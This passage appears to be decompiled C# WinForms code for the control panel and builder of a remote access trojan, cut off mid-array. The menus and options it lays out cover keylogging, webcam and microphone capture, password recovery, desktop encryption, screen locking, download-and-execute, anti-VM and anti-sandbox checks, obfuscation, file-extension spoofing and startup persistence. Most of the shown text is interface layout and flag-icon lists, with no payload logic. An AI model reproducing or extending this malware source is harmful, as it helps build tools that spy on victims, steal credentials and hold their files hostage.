		//IL_9377: Unknown result type (might be due to invalid IL or missing references)
		//IL_9381: Expected O, but got Unknown
		//IL_940f: Unknown result type (might be due to invalid IL or missing references)
		//IL_9419: Expected O, but got Unknown
		//IL_94b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_94c0: Expected O, but got Unknown
		//IL_964b: Unknown result type (might be due to invalid IL or missing references)
		//IL_9799: Unknown result type (might be due to invalid IL or missing references)
		//IL_97a3: Expected O, but got Unknown
		//IL_9838: Unknown result type (might be due to invalid IL or missing references)
		//IL_9842: Expected O, but got Unknown
		//IL_98cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_98d6: Expected O, but got Unknown
		//IL_9954: Unknown result type (might be due to invalid IL or missing references)
		//IL_995e: Expected O, but got Unknown
		//IL_99da: Unknown result type (might be due to invalid IL or missing references)
		//IL_99e4: Expected O, but got Unknown
		//IL_9a6b: Unknown result type (might be due to invalid IL or missing references)
		//IL_9a75: Expected O, but got Unknown
		//IL_9b78: Unknown result type (might be due to invalid IL or missing references)
		//IL_9b82: Expected O, but got Unknown
		//IL_9d68: Unknown result type (might be due to invalid IL or missing references)
		//IL_9d72: Expected O, but got Unknown
		//IL_a022: Unknown result type (might be due to invalid IL or missing references)
		//IL_a02c: Expected O, but got Unknown
		//IL_a0ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_a310: Unknown result type (might be due to invalid IL or missing references)
		//IL_a45f: Unknown result type (might be due to invalid IL or missing references)
		//IL_a469: Expected O, but got Unknown
		//IL_a4f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_a4fa: Expected O, but got Unknown
		//IL_a5a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_a5ad: Expected O, but got Unknown
		//IL_a6d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_a6da: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(FrmMAINGR));
		TreeNode val = new TreeNode("Saved Data");
		ImageList1 = new ImageList(components);
		Timer1 = new Timer(components);
		TabPage1 = new TabPage();
		TabPage2 = new TabPage();
		ClientMenu = new ContextMenuStrip(components);
		ToolStripMenuItem1 = new ToolStripMenuItem();
		RemoteDesktopToolStripMenuItem1 = new ToolStripMenuItem();
		RemoteWebcamToolStripMenuItem = new ToolStripMenuItem();
		ToolStripSeparator1 = new ToolStripSeparator();
		FileManagerToolStripMenuItem = new ToolStripMenuItem();
		ProcessManagerToolStripMenuItem1 = new ToolStripMenuItem();
		ToolStripSeparator6 = new ToolStripSeparator();
		KeyloggerToolStripMenuItem1 = new ToolStripMenuItem();
		MicrophoneToolStripMenuItem = new ToolStripMenuItem();
		ToolStripMenuItem2 = new ToolStripMenuItem();
		SystemInformationToolStripMenuItem = new ToolStripMenuItem();
		PasswordRecoveryToolStripMenuItem = new ToolStripMenuItem();
		ToolStripSeparator4 = new ToolStripSeparator();
		ChatToolStripMenuItem = new ToolStripMenuItem();
		PasstimeToolStripMenuItem = new ToolStripMenuItem();
		ToolStripSeparator7 = new ToolStripSeparator();
		TorrentSeederToolStripMenuItem = new ToolStripMenuItem();
		IPTrackerToolStripMenuItem = new ToolStripMenuItem();
		ToolStripMenuItem3 = new ToolStripMenuItem();
		FromScriptToolStripMenuItem = new ToolStripMenuItem();
		FromLinkToolStripMenuItem = new ToolStripMenuItem();
		FromDiskToolStripMenuItem = new ToolStripMenuItem();
		ToolStripMenuItem4 = new ToolStripMenuItem();
		InstallInformationToolStripMenuItem = new ToolStripMenuItem();
		PingToolStripMenuItem = new ToolStripMenuItem();
		ToolStripSeparator8 = new ToolStripSeparator();
		UpdateToolStripMenuItem = new ToolStripMenuItem();
		FromLinkToolStripMenuItem1 = new ToolStripMenuItem();
		FromDiskToolStripMenuItem1 = new ToolStripMenuItem();
		RenameToolStripMenuItem = new ToolStripMenuItem();
		ToolStripSeparator2 = new ToolStripSeparator();
		CloseToolStripMenuItem = new ToolStripMenuItem();
		UnistallToolStripMenuItem = new ToolStripMenuItem();
		ToolStripSeparator3 = new ToolStripSeparator();
		RestartToolStripMenuItem = new ToolStripMenuItem();
		DiconnectToolStripMenuItem = new ToolStripMenuItem();
		ToolStripSeparator5 = new ToolStripSeparator();
		BlockToolStripMenuItem = new ToolStripMenuItem();
		SelectToolStripMenuItem = new ToolStripMenuItem();
		SelectAllToolStripMenuItem = new ToolStripMenuItem();
		UnsellectToolStripMenuItem = new ToolStripMenuItem();
		OpenFolderToolStripMenuItem = new ToolStripMenuItem();
		EncryptToolStripMenuItem = new ToolStripMenuItem();
		EncryptDESKTOPToolStripMenuItem = new ToolStripMenuItem();
		DecryptDESKTOPToolStripMenuItem = new ToolStripMenuItem();
		LockScreenToolStripMenuItem = new ToolStripMenuItem();
		LockToolStripMenuItem = new ToolStripMenuItem();
		UnlockToolStripMenuItem = new ToolStripMenuItem();
		FunToolStripMenuItem = new ToolStripMenuItem();
		StartInfinityMessagesToolStripMenuItem = new ToolStripMenuItem();
		StopInfinityMessagesToolStripMenuItem = new ToolStripMenuItem();
		ImageList2 = new ImageList(components);
		ContextMenuStrip3 = new ContextMenuStrip(components);
		RemoveCommandToolStripMenuItem = new ToolStripMenuItem();
		ContextMenuStrip2 = new ContextMenuStrip(components);
		AddToolStripMenuItem = new ToolStripMenuItem();
		RemoveToolStripMenuItem = new ToolStripMenuItem();
		ClearListToolStripMenuItem = new ToolStripMenuItem();
		ImageList3 = new ImageList(components);
		EtherealTabControl2 = new EtherealTabControl();
		TabPage4 = new TabPage();
		StatusStrip4 = new StatusStrip();
		clientslabel = new ToolStripStatusLabel();
		listV1 = new ListView();
		ColumnHeader1 = new ColumnHeader();
		ColumnHeader2 = new ColumnHeader();
		ColumnHeader3 = new ColumnHeader();
		ColumnHeader4 = new ColumnHeader();
		ColumnHeader5 = new ColumnHeader();
		ColumnHeader6 = new ColumnHeader();
		ColumnHeader7 = new ColumnHeader();
		ColumnHeader8 = new ColumnHeader();
		ColumnHeader9 = new ColumnHeader();
		ColumnHeader10 = new ColumnHeader();
		ColumnHeader11 = new ColumnHeader();
		ColumnHeader12 = new ColumnHeader();
		ColumnHeader13 = new ColumnHeader();
		TabPage5 = new TabPage();
		Panel2 = new Panel();
		GroupBox9 = new GroupBox();
		GroupBox15 = new GroupBox();
		Label29 = new Label();
		Label28 = new Label();
		Label7 = new Label();
		Label6 = new Label();
		MSGPic = new PictureBox();
		MSGPRI = new Button();
		MSGBUTTON = new ComboBox();
		MSGICON = new ComboBox();
		MSGB = new TextBox();
		MSGT = new TextBox();
		CBMSG = new CheckBox();
		GroupBox10 = new GroupBox();
		TabControl2 = new TabControl();
		TabPage17 = new TabPage();
		CBdrop = new CheckBox();
		GroupBox11 = new GroupBox();
		Label19 = new Label();
		CDP = new ComboBox();
		Label18 = new Label();
		TBDN = new TextBox();
		TabPage14 = new TabPage();
		TBVBS = new TextBox();
		CBVBS = new CheckBox();
		TBJS = new TextBox();
		CBJS = new CheckBox();
		TBURL = new TextBox();
		CBURL = new CheckBox();
		TBSEXE = new TextBox();
		CBSEXE = new CheckBox();
		TabPage15 = new TabPage();
		CBREG = new CheckBox();
		GroupBox12 = new GroupBox();
		TBRK = new TextBox();
		Label20 = new Label();
		Label21 = new Label();
		TBRV = new TextBox();
		TabPage16 = new TabPage();
		CBST = new CheckBox();
		GroupBox13 = new GroupBox();
		Label25 = new Label();
		TBSTT = new NumericUpDown();
		Label22 = new Label();
		Label23 = new Label();
		TBSTN = new TextBox();
		GroupBox2 = new GroupBox();
		Button7 = new Button();
		Button6 = new Button();
		Button4 = new Button();
		Button3 = new Button();
		GroupBox16 = new GroupBox();
		pumpcb = new ComboBox();
		Pumpv = new NumericUpDown();
		pumpch = new CheckBox();
		CBPRESS = new CheckBox();
		CSPOOFER = new ComboBox();
		CBSPOOF = new CheckBox();
		GroupBox5 = new GroupBox();
		RDicon = new RadioButton();
		RBnoicon = new RadioButton();
		addicon = new Button();
		iconbox = new PictureBox();
		GroupBox7 = new GroupBox();
		GroupBox3 = new GroupBox();
		Button5 = new Button();
		ass8 = new TextBox();
		ass7 = new TextBox();
		ass6 = new TextBox();
		ass5 = new TextBox();
		ass4 = new TextBox();
		ass3 = new TextBox();
		ass2 = new TextBox();
		ass1 = new TextBox();
		Label17 = new Label();
		Label16 = new Label();
		Label15 = new Label();
		Label14 = new Label();
		Label13 = new Label();
		Label12 = new Label();
		Label11 = new Label();
		Label3 = new Label();
		CBass = new CheckBox();
		GroupBox1 = new GroupBox();
		GroupBox14 = new GroupBox();
		Label24 = new Label();
		SBSLEEP = new CheckBox();
		Label8 = new Label();
		sleep = new NumericUpDown();
		Label26 = new Label();
		Label27 = new Label();
		recdelay = new NumericUpDown();
		GroupBox8 = new GroupBox();
		ATAM = new CheckBox();
		OPT = new CheckBox();
		STEN = new CheckBox();
		CBRAND = new CheckBox();
		Obfu = new CheckBox();
		ANIL = new CheckBox();
		CBPROPRIO = new ComboBox();
		CBHIDEE = new CheckBox();
		CBPROPRI = new CheckBox();
		ANTIE = new CheckBox();
		ANTID = new CheckBox();
		ANTIW = new CheckBox();
		ANTISB = new CheckBox();
		ANTIVM = new CheckBox();
		GroupBox4 = new GroupBox();
		Button2 = new Button();
		Label10 = new Label();
		Label9 = new Label();
		clientidtextbox = new TextBox();
		mutextxtbox = new TextBox();
		GroupBox6 = new GroupBox();
		hostsports = new ListView();
		ColumnHeader14 = new ColumnHeader();
		ColumnHeader15 = new ColumnHeader();
		ContextMenuStrip4 = new ContextMenuStrip(components);
		AddToolStripMenuItem1 = new ToolStripMenuItem();
		EditToolStripMenuItem = new ToolStripMenuItem();
		RemoveToolStripMenuItem1 = new ToolStripMenuItem();
		ClearListToolStripMenuItem1 = new ToolStripMenuItem();
		Addhosts = new Button();
		Porttxtbox = new NumericUpDown();
		hosttxtbox = new TextBox();
		TabPage8 = new TabPage();
		StatusStrip5 = new StatusStrip();
		clientsloglabel = new ToolStripStatusLabel();
		Logs = new ListView();
		ColumnHeader16 = new ColumnHeader();
		ColumnHeader17 = new ColumnHeader();
		TabPage6 = new TabPage();
		Panel3 = new Panel();
		REFF = new Button();
		REFM = new Button();
		RFM = new Button();
		Label1 = new Label();
		PM = new PictureBox();
		TabPage7 = new TabPage();
		Panel1 = new Panel();
		AddCommand = new Button();
		Label5 = new Label();
		Label4 = new Label();
		Commanddata = new TextBox();
		Label2 = new Label();
		Comands = new ComboBox();
		Commandslistview = new ListView();
		ColumnHeader20 = new ColumnHeader();
		ColumnHeader21 = new ColumnHeader();
		ColumnHeader22 = new ColumnHeader();
		TabPage9 = new TabPage();
		BlockedIP = new ListView();
		ColumnHeader18 = new ColumnHeader();
		ColumnHeader19 = new ColumnHeader();
		StatusStrip1 = new StatusStrip();
		blacklistlabel = new ToolStripStatusLabel();
		TabPage11 = new TabPage();
		TabControl1 = new TabControl();
		TabPage12 = new TabPage();
		StatusStrip2 = new StatusStrip();
		ToolStripStatusLabel1 = new ToolStripStatusLabel();
		TextBox1 = new TextBox();
		TabPage13 = new TabPage();
		StatusStrip3 = new StatusStrip();
		ToolStripStatusLabel2 = new ToolStripStatusLabel();
		PictureBox1 = new PictureBox();
		REF = new Button();
		TreeView1 = new TreeView();
		((Control)ClientMenu).SuspendLayout();
		((Control)ContextMenuStrip3).SuspendLayout();
		((Control)ContextMenuStrip2).SuspendLayout();
		((Control)EtherealTabControl2).SuspendLayout();
		((Control)TabPage4).SuspendLayout();
		((Control)StatusStrip4).SuspendLayout();
		((Control)TabPage5).SuspendLayout();
		((Control)Panel2).SuspendLayout();
		((Control)GroupBox9).SuspendLayout();
		((Control)GroupBox15).SuspendLayout();
		((ISupportInitialize)MSGPic).BeginInit();
		((Control)GroupBox10).SuspendLayout();
		((Control)TabControl2).SuspendLayout();
		((Control)TabPage17).SuspendLayout();
		((Control)GroupBox11).SuspendLayout();
		((Control)TabPage14).SuspendLayout();
		((Control)TabPage15).SuspendLayout();
		((Control)GroupBox12).SuspendLayout();
		((Control)TabPage16).SuspendLayout();
		((Control)GroupBox13).SuspendLayout();
		((ISupportInitialize)TBSTT).BeginInit();
		((Control)GroupBox2).SuspendLayout();
		((Control)GroupBox16).SuspendLayout();
		((ISupportInitialize)Pumpv).BeginInit();
		((Control)GroupBox5).SuspendLayout();
		((ISupportInitialize)iconbox).BeginInit();
		((Control)GroupBox7).SuspendLayout();
		((Control)GroupBox3).SuspendLayout();
		((Control)GroupBox1).SuspendLayout();
		((Control)GroupBox14).SuspendLayout();
		((ISupportInitialize)sleep).BeginInit();
		((ISupportInitialize)recdelay).BeginInit();
		((Control)GroupBox8).SuspendLayout();
		((Control)GroupBox4).SuspendLayout();
		((Control)GroupBox6).SuspendLayout();
		((Control)ContextMenuStrip4).SuspendLayout();
		((ISupportInitialize)Porttxtbox).BeginInit();
		((Control)TabPage8).SuspendLayout();
		((Control)StatusStrip5).SuspendLayout();
		((Control)TabPage6).SuspendLayout();
		((Control)Panel3).SuspendLayout();
		((ISupportInitialize)PM).BeginInit();
		((Control)TabPage7).SuspendLayout();
		((Control)Panel1).SuspendLayout();
		((Control)TabPage9).SuspendLayout();
		((Control)StatusStrip1).SuspendLayout();
		((Control)TabPage11).SuspendLayout();
		((Control)TabControl1).SuspendLayout();
		((Control)TabPage12).SuspendLayout();
		((Control)StatusStrip2).SuspendLayout();
		((Control)TabPage13).SuspendLayout();
		((Control)StatusStrip3).SuspendLayout();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		ImageList1.set_ImageStream((ImageListStreamer)componentResourceManager.GetObject("ImageList1.ImageStream"));
		ImageList1.set_TransparentColor(Color.Transparent);
		ImageList1.get_Images().SetKeyName(0, "--.png");
		ImageList1.get_Images().SetKeyName(1, "ad.png");
		ImageList1.get_Images().SetKeyName(2, "ae.png");
		ImageList1.get_Images().SetKeyName(3, "af.png");
		ImageList1.get_Images().SetKeyName(4, "ag.png");
		ImageList1.get_Images().SetKeyName(5, "ai.png");
		ImageList1.get_Images().SetKeyName(6, "al.png");
		ImageList1.get_Images().SetKeyName(7, "am.png");
		ImageList1.get_Images().SetKeyName(8, "an.png");
		ImageList1.get_Images().SetKeyName(9, "ao.png");
		ImageList1.get_Images().SetKeyName(10, "ar.png");
		ImageList1.get_Images().SetKeyName(11, "as.png");
		ImageList1.get_Images().SetKeyName(12, "at.png");
		ImageList1.get_Images().SetKeyName(13, "au.png");
		ImageList1.get_Images().SetKeyName(14, "aw.png");
		ImageList1.get_Images().SetKeyName(15, "ax.png");
		ImageList1.get_Images().SetKeyName(16, "az.png");
		ImageList1.get_Images().SetKeyName(17, "ba.png");
		ImageList1.get_Images().SetKeyName(18, "bb.png");
		ImageList1.get_Images().SetKeyName(19, "bd.png");
		ImageList1.get_Images().SetKeyName(20, "be.png");
		ImageList1.get_Images().SetKeyName(21, "bf.png");
		ImageList1.get_Images().SetKeyName(22, "bg.png");
		ImageList1.get_Images().SetKeyName(23, "bh.png");
		ImageList1.get_Images().SetKeyName(24, "bi.png");
		ImageList1.get_Images().SetKeyName(25, "bj.png");
		ImageList1.get_Images().SetKeyName(26, "bm.png");
		ImageList1.get_Images().SetKeyName(27, "bn.png");
		ImageList1.get_Images().SetKeyName(28, "bo.png");
		ImageList1.get_Images().SetKeyName(29, "br.png");
		ImageList1.get_Images().SetKeyName(30, "bs.png");
		ImageList1.get_Images().SetKeyName(31, "bt.png");
		ImageList1.get_Images().SetKeyName(32, "bv.png");
		ImageList1.get_Images().SetKeyName(33, "bw.png");
		ImageList1.get_Images().SetKeyName(34, "by.png");
		ImageList1.get_Images().SetKeyName(35, "bz.png");
		ImageList1.get_Images().SetKeyName(36, "ca.png");
		ImageList1.get_Images().SetKeyName(37, "catalonia.png");
		ImageList1.get_Images().SetKeyName(38, "cc.png");
		ImageList1.get_Images().SetKeyName(39, "cd.png");
		ImageList1.get_Images().SetKeyName(40, "cf.png");
		ImageList1.get_Images().SetKeyName(41, "cg.png");
		ImageList1.get_Images().SetKeyName(42, "ch.png");
		ImageList1.get_Images().SetKeyName(43, "ci.png");
		ImageList1.get_Images().SetKeyName(44, "ck.png");
		ImageList1.get_Images().SetKeyName(45, "cl.png");
		ImageList1.get_Images().SetKeyName(46, "cm.png");
		ImageList1.get_Images().SetKeyName(47, "cn.png");
		ImageList1.get_Images().SetKeyName(48, "co.png");
		ImageList1.get_Images().SetKeyName(49, "cr.png");
		ImageList1.get_Images().SetKeyName(50, "cs.png");
		ImageList1.get_Images().SetKeyName(51, "cu.png");
		ImageList1.get_Images().SetKeyName(52, "cv.png");
		ImageList1.get_Images().SetKeyName(53, "cw.png");
		ImageList1.get_Images().SetKeyName(54, "cx.png");
		ImageList1.get_Images().SetKeyName(55, "cy.png");
		ImageList1.get_Images().SetKeyName(56, "cz.png");
		ImageList1.get_Images().SetKeyName(57, "de.png");
		ImageList1.get_Images().SetKeyName(58, "dj.png");
		ImageList1.get_Images().SetKeyName(59, "dk.png");
		ImageList1.get_Images().SetKeyName(60, "dm.png");
		ImageList1.get_Images().SetKeyName(61, "do.png");
		ImageList1.get_Images().SetKeyName(62, "dz.png");
		ImageList1.get_Images().SetKeyName(63, "ec.png");
		ImageList1.get_Images().SetKeyName(64, "ee.png");
		ImageList1.get_Images().SetKeyName(65, "eg.png");
		ImageList1.get_Images().SetKeyName(66, "eh.png");
		ImageList1.get_Images().SetKeyName(67, "england.png");
		ImageList1.get_Images().SetKeyName(68, "er.png");
		ImageList1.get_Images().SetKeyName(69, "es.png");
		ImageList1.get_Images().SetKeyName(70, "et.png");
		ImageList1.get_Images().SetKeyName(71, "europeanunion.png");
		ImageList1.get_Images().SetKeyName(72, "fam.png");
		ImageList1.get_Images().SetKeyName(73, "fi.png");
		ImageList1.get_Images().SetKeyName(74, "fj.png");
		ImageList1.get_Images().SetKeyName(75, "fk.png");
		ImageList1.get_Images().SetKeyName(76, "fm.png");
		ImageList1.get_Images().SetKeyName(77, "fo.png");
		ImageList1.get_Images().SetKeyName(78, "fr.png");
		ImageList1.get_Images().SetKeyName(79, "ga.png");
		ImageList1.get_Images().SetKeyName(80, "gb.png");
		ImageList1.get_Images().SetKeyName(81, "gd.png");
		ImageList1.get_Images().SetKeyName(82, "ge.png");
		ImageList1.get_Images().SetKeyName(83, "gf.png");
		ImageList1.get_Images().SetKeyName(84, "gg.png");
		ImageList1.get_Images().SetKeyName(85, "gh.png");
		ImageList1.get_Images().SetKeyName(86, "gi.png");
		ImageList1.get_Images().SetKeyName(87, "gl.png");
		ImageList1.get_Images().SetKeyName(88, "gm.png");
		ImageList1.get_Images().SetKeyName(89, "gn.png");
		ImageList1.get_Images().SetKeyName(90, "gp.png");
		ImageList1.get_Images().SetKeyName(91, "gq.png");
		ImageList1.get_Images().SetKeyName(92, "gr.png");
		ImageList1.get_Images().SetKeyName(93, "gs.png");
		ImageList1.get_Images().SetKeyName(94, "gt.png");
		ImageList1.get_Images().SetKeyName(95, "gu.png");
		ImageList1.get_Images().SetKeyName(96, "gw.png");
		ImageList1.get_Images().SetKeyName(97, "gy.png");
		ImageList1.get_Images().SetKeyName(98, "hk.png");
		ImageList1.get_Images().SetKeyName(99, "hm.png");
		ImageList1.get_Images().SetKeyName(100, "hn.png");
		ImageList1.get_Images().SetKeyName(101, "hr.png");
		ImageList1.get_Images().SetKeyName(102, "ht.png");
		ImageList1.get_Images().SetKeyName(103, "hu.png");
		ImageList1.get_Images().SetKeyName(104, "id.png");
		ImageList1.get_Images().SetKeyName(105, "ie.png");
		ImageList1.get_Images().SetKeyName(106, "il.png");
		ImageList1.get_Images().SetKeyName(107, "im.png");
		ImageList1.get_Images().SetKeyName(108, "in.png");
		ImageList1.get_Images().SetKeyName(109, "io.png");
		ImageList1.get_Images().SetKeyName(110, "iq.png");
		ImageList1.get_Images().SetKeyName(111, "ir.png");
		ImageList1.get_Images().SetKeyName(112, "is.png");
		ImageList1.get_Images().SetKeyName(113, "it.png");
		ImageList1.get_Images().SetKeyName(114, "je.png");
		ImageList1.get_Images().SetKeyName(115, "jm.png");
		ImageList1.get_Images().SetKeyName(116, "jo.png");
		ImageList1.get_Images().SetKeyName(117, "jp.png");
		ImageList1.get_Images().SetKeyName(118, "ke.png");
		ImageList1.get_Images().SetKeyName(119, "kg.png");
		ImageList1.get_Images().SetKeyName(120, "kh.png");
		ImageList1.get_Images().SetKeyName(121, "ki.png");
		ImageList1.get_Images().SetKeyName(122, "km.png");
		ImageList1.get_Images().SetKeyName(123, "kn.png");
		ImageList1.get_Images().SetKeyName(124, "kp.png");
		ImageList1.get_Images().SetKeyName(125, "kr.png");
		ImageList1.get_Images().SetKeyName(126, "kw.png");
		ImageList1.get_Images().SetKeyName(127, "ky.png");
		ImageList1.get_Images().SetKeyName(128, "kz.png");
		ImageList1.get_Images().SetKeyName(129, "la.png");
		ImageList1.get_Images().SetKeyName(130, "lb.png");
		ImageList1.get_Images().SetKeyName(131, "lc.png");
		ImageList1.get_Images().SetKeyName(132, "li.png");
		ImageList1.get_Images().SetKeyName(133, "lk.png");
		ImageList1.get_Images().SetKeyName(134, "lr.png");
		ImageList1.get_Images().SetKeyName(135, "ls.png");
		ImageList1.get_Images().SetKeyName(136, "lt.png");
		ImageList1.get_Images().SetKeyName(137, "lu.png");
		ImageList1.get_Images().SetKeyName(138, "lv.png");
		ImageList1.get_Images().SetKeyName(139, "ly.png");
		ImageList1.get_Images().SetKeyName(140, "ma.png");
		ImageList1.get_Images().SetKeyName(141, "mc.png");
		ImageList1.get_Images().SetKeyName(142, "md.png");
		ImageList1.get_Images().SetKeyName(143, "me.png");
		ImageList1.get_Images().SetKeyName(144, "mg.png");
		ImageList1.get_Images().SetKeyName(145, "mh.png");
		ImageList1.get_Images().SetKeyName(146, "mk.png");
		ImageList1.get_Images().SetKeyName(147, "ml.png");
		ImageList1.get_Images().SetKeyName(148, "mm.png");
		ImageList1.get_Images().SetKeyName(149, "mn.png");
		ImageList1.get_Images().SetKeyName(150, "mo.png");
		ImageList1.get_Images().SetKeyName(151, "mp.png");
		ImageList1.get_Images().SetKeyName(152, "mq.png");
		ImageList1.get_Images().SetKeyName(153, "mr.png");
		ImageList1.get_Images().SetKeyName(154, "ms.png");
		ImageList1.get_Images().SetKeyName(155, "mt.png");
		ImageList1.get_Images().SetKeyName(156, "mu.png");
		ImageList1.get_Images().SetKeyName(157, "mv.png");
		ImageList1.get_Images().SetKeyName(158, "mw.png");
		ImageList1.get_Images().SetKeyName(159, "mx.png");
		ImageList1.get_Images().SetKeyName(160, "my.png");
		ImageList1.get_Images().SetKeyName(161, "mz.png");
		ImageList1.get_Images().SetKeyName(162, "na.png");
		ImageList1.get_Images().SetKeyName(163, "nc.png");
		ImageList1.get_Images().SetKeyName(164, "ne.png");
		ImageList1.get_Images().SetKeyName(165, "nf.png");
		ImageList1.get_Images().SetKeyName(166, "ng.png");
		ImageList1.get_Images().SetKeyName(167, "ni.png");
		ImageList1.get_Images().SetKeyName(168, "nl.png");
		ImageList1.get_Images().SetKeyName(169, "no.png");
		ImageList1.get_Images().SetKeyName(170, "np.png");
		ImageList1.get_Images().SetKeyName(171, "nr.png");
		ImageList1.get_Images().SetKeyName(172, "nu.png");
		ImageList1.get_Images().SetKeyName(173, "nz.png");
		ImageList1.get_Images().SetKeyName(174, "om.png");
		ImageList1.get_Images().SetKeyName(175, "pa.png");
		ImageList1.get_Images().SetKeyName(176, "pe.png");
		ImageList1.get_Images().SetKeyName(177, "pf.png");
		ImageList1.get_Images().SetKeyName(178, "pg.png");
		ImageList1.get_Images().SetKeyName(179, "ph.png");
		ImageList1.get_Images().SetKeyName(180, "pk.png");
		ImageList1.get_Images().SetKeyName(181, "pl.png");
		ImageList1.get_Images().SetKeyName(182, "pm.png");
		ImageList1.get_Images().SetKeyName(183, "pn.png");
		ImageList1.get_Images().SetKeyName(184, "pr.png");
		ImageList1.get_Images().SetKeyName(185, "ps.png");
		ImageList1.get_Images().SetKeyName(186, "pt.png");
		ImageList1.get_Images().SetKeyName(187, "pw.png");
		ImageList1.get_Images().SetKeyName(188, "py.png");
		ImageList1.get_Images().SetKeyName(189, "qa.png");
		ImageList1.get_Images().SetKeyName(190, "re.png");
		ImageList1.get_Images().SetKeyName(191, "ro.png");
		ImageList1.get_Images().SetKeyName(192, "rs.png");
		ImageList1.get_Images().SetKeyName(193, "ru.png");
		ImageList1.get_Images().SetKeyName(194, "rw.png");
		ImageList1.get_Images().SetKeyName(195, "sa.png");
		ImageList1.get_Images().SetKeyName(196, "sb.png");
		ImageList1.get_Images().SetKeyName(197, "sc.png");
		ImageList1.get_Images().SetKeyName(198, "scotland.png");
		ImageList1.get_Images().SetKeyName(199, "sd.png");
		ImageList1.get_Images().SetKeyName(200, "se.png");
		ImageList1.get_Images().SetKeyName(201, "sg.png");
		ImageList1.get_Images().SetKeyName(202, "sh.png");
		ImageList1.get_Images().SetKeyName(203, "si.png");
		ImageList1.get_Images().SetKeyName(204, "sj.png");
		ImageList1.get_Images().SetKeyName(205, "sk.png");
		ImageList1.get_Images().SetKeyName(206, "sl.png");
		ImageList1.get_Images().SetKeyName(207, "sm.png");
		ImageList1.get_Images().SetKeyName(208, "sn.png");
		ImageList1.get_Images().SetKeyName(209, "so.png");
		ImageList1.get_Images().SetKeyName(210, "sr.png");
		ImageList1.get_Images().SetKeyName(211, "ss.png");
		ImageList1.get_Images().SetKeyName(212, "st.png");
		ImageList1.get_Images().SetKeyName(213, "sv.png");
		ImageList1.get_Images().SetKeyName(214, "sx.png");
		ImageList1.get_Images().SetKeyName(215, "sy.png");
		ImageList1.get_Images().SetKeyName(216, "sz.png");
		ImageList1.get_Images().SetKeyName(217, "tc.png");
		ImageList1.get_Images().SetKeyName(218, "td.png");
		ImageList1.get_Images().SetKeyName(219, "tf.png");
		ImageList1.get_Images().SetKeyName(220, "tg.png");
		ImageList1.get_Images().SetKeyName(221, "th.png");
		ImageList1.get_Images().SetKeyName(222, "tj.png");
		ImageList1.get_Images().SetKeyName(223, "tk.png");
		ImageList1.get_Images().SetKeyName(224, "tl.png");
		ImageList1.get_Images().SetKeyName(225, "tm.png");
		ImageList1.get_Images().SetKeyName(226, "tn.png");
		ImageList1.get_Images().SetKeyName(227, "to.png");
		ImageList1.get_Images().SetKeyName(228, "tr.png");
		ImageList1.get_Images().SetKeyName(229, "tt.png");
		ImageList1.get_Images().SetKeyName(230, "tv.png");
		ImageList1.get_Images().SetKeyName(231, "tw.png");
		ImageList1.get_Images().SetKeyName(232, "tz.png");
		ImageList1.get_Images().SetKeyName(233, "ua.png");
		ImageList1.get_Images().SetKeyName(234, "ug.png");
		ImageList1.get_Images().SetKeyName(235, "um.png");
		ImageList1.get_Images().SetKeyName(236, "us.png");
		ImageList1.get_Images().SetKeyName(237, "uy.png");
		ImageList1.get_Images().SetKeyName(238, "uz.png");
		ImageList1.get_Images().SetKeyName(239, "va.png");
		ImageList1.get_Images().SetKeyName(240, "vc.png");
		ImageList1.get_Images().SetKeyName(241, "ve.png");
		ImageList1.get_Images().SetKeyName(242, "vg.png");
		ImageList1.get_Images().SetKeyName(243, "vi.png");
		ImageList1.get_Images().SetKeyName(244, "vn.png");
		ImageList1.get_Images().SetKeyName(245, "vu.png");
		ImageList1.get_Images().SetKeyName(246, "wales.png");
		ImageList1.get_Images().SetKeyName(247, "wf.png");
		ImageList1.get_Images().SetKeyName(248, "ws.png");
		ImageList1.get_Images().SetKeyName(249, "ye.png");
		ImageList1.get_Images().SetKeyName(250, "yt.png");
		ImageList1.get_Images().SetKeyName(251, "za.png");
		ImageList1.get_Images().SetKeyName(252, "zm.png");
		ImageList1.get_Images().SetKeyName(253, "zw.png");
		Timer1.set_Interval(800);
		TabPage tabPage = TabPage1;
		Point location = new Point(154, 4);
		tabPage.set_Location(location);
		((Control)TabPage1).set_Name("TabPage1");
		TabPage tabPage2 = TabPage1;
		Padding padding = default(Padding);
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage2).set_Padding(padding);
		TabPage tabPage3 = TabPage1;
		Size size = new Size(211, 92);
		((Control)tabPage3).set_Size(size);
		TabPage1.set_TabIndex(0);
		TabPage1.set_Text("TabPage1");
		TabPage1.set_UseVisualStyleBackColor(true);
		TabPage tabPage4 = TabPage2;
		location = new Point(154, 4);
		tabPage4.set_Location(location);
		((Control)TabPage2).set_Name("TabPage2");
		TabPage tabPage5 = TabPage2;
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage5).set_Padding(padding);
		TabPage tabPage6 = TabPage2;
		size = new Size(211, 92);
		((Control)tabPage6).set_Size(size);
		TabPage2.set_TabIndex(1);
		TabPage2.set_Text("TabPage2");
		TabPage2.set_UseVisualStyleBackColor(true);
		((ToolStrip)ClientMenu).set_BackColor(Color.White);
		ContextMenuStrip clientMenu = ClientMenu;
		size = new Size(19, 19);
		((ToolStrip)clientMenu).set_ImageScalingSize(size);
		((ToolStrip)ClientMenu).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[9]
		{
			(ToolStripItem)ToolStripMenuItem1,
			(ToolStripItem)ToolStripMenuItem2,
			(ToolStripItem)ToolStripMenuItem3,
			(ToolStripItem)ToolStripMenuItem4,
			(ToolStripItem)SelectToolStripMenuItem,
			(ToolStripItem)OpenFolderToolStripMenuItem,
			(ToolStripItem)EncryptToolStripMenuItem,
			(ToolStripItem)LockScreenToolStripMenuItem,
			(ToolStripItem)FunToolStripMenuItem
		});
		((Control)ClientMenu).set_Name("ContextMenuStrip1");
		ContextMenuStrip clientMenu2 = ClientMenu;
		size = new Size(164, 238);
		((Control)clientMenu2).set_Size(size);
		((ToolStripDropDownItem)ToolStripMenuItem1).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[8]
		{
